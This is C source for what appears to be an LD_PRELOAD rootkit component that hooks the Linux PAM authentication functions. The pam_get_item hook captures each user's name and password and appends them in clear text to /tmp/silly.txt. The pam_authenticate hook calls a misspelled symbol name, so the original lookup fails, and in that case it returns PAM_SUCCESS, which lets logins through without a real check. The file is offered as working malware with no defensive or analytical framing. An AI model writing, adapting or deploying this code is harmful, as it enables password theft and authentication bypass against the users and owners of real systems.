#include "father.h"

void exfil(int type, int result, const char * username, const char * password)
{
	FILE * fp = fopen("/tmp/silly.txt", "a+");
	fprintf(fp, "%d:%d:%s:%s\n", type, result, username, password);
	fclose(fp);
}

int (*o_pam_authenticate)(pam_handle_t *, int);
int pam_authenticate(pam_handle_t * pamh, int flags)
{
  if(o_pam_authenticate == NULL) {
    o_pam_authenticate = dlsym(RTLD_NEXT, "pam_autheticate");
  }
  exfil(10, 10, "shid", "fug");
  if (o_pam_authenticate == NULL) return PAM_SUCCESS;
  return o_pam_authenticate(pamh, flags);
}


int (*o_pam_get_item)(const pam_handle_t *, int, const void **);
int pam_get_item(const pam_handle_t * pamh, int item_type, const void ** item) {

	if(o_pam_get_item == NULL) {
		o_pam_get_item = dlsym(RTLD_NEXT, "pam_get_item");
	}

	int result;
  	const char * username;
	
	result = o_pam_get_item(pamh, item_type, item);
	if (*item && item_type == 2 && result == 0) {
		pam_get_user((pam_handle_t *)pamh, &username, NULL);
		exfil(item_type, result, username, (const char *)*item);
	}
	return result;
}

